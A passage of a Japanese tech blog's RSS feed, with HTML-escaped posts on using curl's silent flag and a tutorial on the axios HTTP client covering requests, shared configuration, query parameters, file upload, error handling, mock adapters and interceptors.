&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ curl -s URL
$ curl --silent URL
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;curlは以下のような進捗状況を表示してくれますが、-sでこの表示を抑制します&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   112  100   112    0     0    424      0 --:--:-- --:--:-- --:--:--   424
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;このあとは&#34;&gt;このあとは・・・？&lt;/h2&gt;
&lt;p&gt;使わないと覚えないので、試しにコマンドを叩いてみることをお勧めします。&lt;code&gt;Public API&lt;/code&gt;と検索すれば無料で使えるAPIが表示されるので、そこの中から選んでcurlしてみましょう！QiitaにもPublic APIをまとめている記事があったので、参考に載せておきます。私はこの中の、&lt;a class=&#34;link&#34; href=&#34;https://icanhazdadjoke.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://icanhazdadjoke.com/&lt;/a&gt; (親父ギャグを返してくれるAPI)を使って試しました。&lt;/p&gt;
&lt;h2 id=&#34;参考&#34;&gt;参考&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://qiita.com/danishi/items/42d8adf6291515e62284&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;【随時更新】一風変わったWeb APIをまとめてみた&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>axiosの使い方</title>
        <link>https://tadakun8.github.io/post/usage-axios/</link>
        <pubDate>Sun, 13 Jun 2021 10:04:20 +0900</pubDate>
        
        <guid>https://tadakun8.github.io/post/usage-axios/</guid>
        <description>&lt;h3 id=&#34;インストール方法&#34;&gt;インストール方法&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;$ npm install axios
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;get-post-put-deleteリクエスト&#34;&gt;GET, POST, PUT, DELETEリクエスト&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;responseGet&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;await&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;axios&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;http://example.com/api/sample&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;responsePost&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;await&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;axios&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;post&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;http://example.com/api/sample&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;})&lt;/span&gt;

&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;responsePut&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;await&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;axios&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;put&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;http://example.com/api/sample&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;})&lt;/span&gt;

&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;responseDelete&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;await&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;axios&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;delete&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;http://example.com/api/sample&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;})&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;axiosでの共通設定をしたいとき&#34;&gt;axiosでの共通設定をしたいとき&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// axiosを使う時の共通設定
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;config&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;AxiosRequestConfig&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;// axiosClient.get(&amp;#39;sample&amp;#39;)でhttp://example.com/api/sampleへのリクエストになるように設定
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nx&#34;&gt;baseURL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;http://example.com/api/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;// タイムアウト(ミリ秒)
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nx&#34;&gt;timeout&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;// カスタムヘッダーも定義できる
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nx&#34;&gt;headers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;s1&#34;&gt;&amp;#39;Authorization&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;sample-token&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;// 共通設定をしたaxiosインスタンスの生成
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;axiosClient&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;AxiosInstance&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;axios&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;create&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;config&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;共通設定できる値は上記以外にもまだまだあるので、詳しくは&lt;a class=&#34;link&#34; href=&#34;https://github.com/axios/axios#request-config&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;axiosの公式HP&lt;/a&gt;に記載されてます&lt;/p&gt;
&lt;p&gt;※ 以降はaxiosClientを使う前提です&lt;/p&gt;
&lt;h3 id=&#34;共通設定で指定している値をこのapiでは適用したくない場合&#34;&gt;共通設定で指定している値をこのAPIでは適用したくない場合&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;axiosClient&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;sample&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;timeout&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2000&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;})&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ユースケースとしては、以下が当てはまりそうです&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;あるAPIのリクエストではタイムアウトの値を伸ばしたい&lt;/li&gt;
&lt;li&gt;あるAPIだけ、カスタムヘッダーを定義したい&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;クエリパラメータ付きリクエスト&#34;&gt;クエリパラメータ付きリクエスト&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// http://eample.com/api/sample?id=3となる
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;responseQueryParam&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;await&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;axiosClient&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;sample&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;params&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;nx&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;})&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;画像をアップロード&#34;&gt;画像をアップロード&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;formData&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;FormData&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;formData&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;fineName&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;実際のファイルオブジェクト&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;responseFormData&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;await&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;axiosClient&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;post&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;sample&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;formData&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;headers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;s1&#34;&gt;&amp;#39;content-type&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;multipart/form-data&amp;#39;&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;})&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;エラーハンドリング&#34;&gt;エラーハンドリング&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;responseError&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;await&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;axiosClient&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;sample&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;response&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;responseError&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;status&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;200&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;console&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;例外処理を記載する&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;モックのレスポンスを返したい&#34;&gt;モックのレスポンスを返したい&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mockResponseData&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;title&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;平成狸合戦ぽんぽこ&amp;#39;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mockAdapter&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;config&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Promise&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;resolve&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;reject&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
      &lt;span class=&#34;nx&#34;&gt;resolve&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;({&lt;/span&gt;　&lt;span class=&#34;nx&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mockResponseData&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;status&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;200&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;})&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;})&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;responseMock&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;await&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;axiosClient&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;url&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;adapter&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mockAdapter&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;})&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;(バックエンドが実装されていないが、フロントエンドの動作確認をしたいときに使えそう)&lt;/p&gt;
&lt;h3 id=&#34;処理を差し込みたい&#34;&gt;処理を差し込みたい&lt;/h3&gt;
&lt;p&gt;以下は、最終的にどういうリクエストを送ったのか、どういうレスポンスが返ってきたのかをログを出力するような差し込み処理です&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;nx&#34;&gt;axiosClient&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;interceptors&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;request&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;use&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;config&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;console&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;JSON&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;stringify&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;config&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;config&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;})&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;axiosClient&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;interceptors&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;response&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;use&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;response&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;console&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;JSON&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;stringify&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;response&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;response&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;})&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;axios&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;interceptors&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;request&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;use&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;config&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;console&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;interceptのuseはrequest、responseで複数書ける&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;console&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;実行される順番は最初に定義したものからinterceptされる&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;console&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;目的ごとにuseを分けた方がよいだろう&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;config&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;})&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;おわりに&#34;&gt;おわりに&lt;/h3&gt;
&lt;p&gt;先人たちがまとめてくださった記事をもとに、axiosを使うときに困らないだろう程度にはまとめることができました。&lt;/p&gt;
&lt;p&gt;debugのたびに&lt;code&gt;console.log(JSON.stringfy(response))&lt;/code&gt;などで値を見てましたが、interceptorsにログ出力を設定してあるaxiosインスタンスを使えば、その必要がなくなりそうです。&lt;/p&gt;
&lt;h3 id=&#34;参考&#34;&gt;参考&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://zenn.dev/terrierscript/articles/2017-02-02-axios&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;axios 知見集(2017)&lt;/a&gt;&lt;/li&gt;
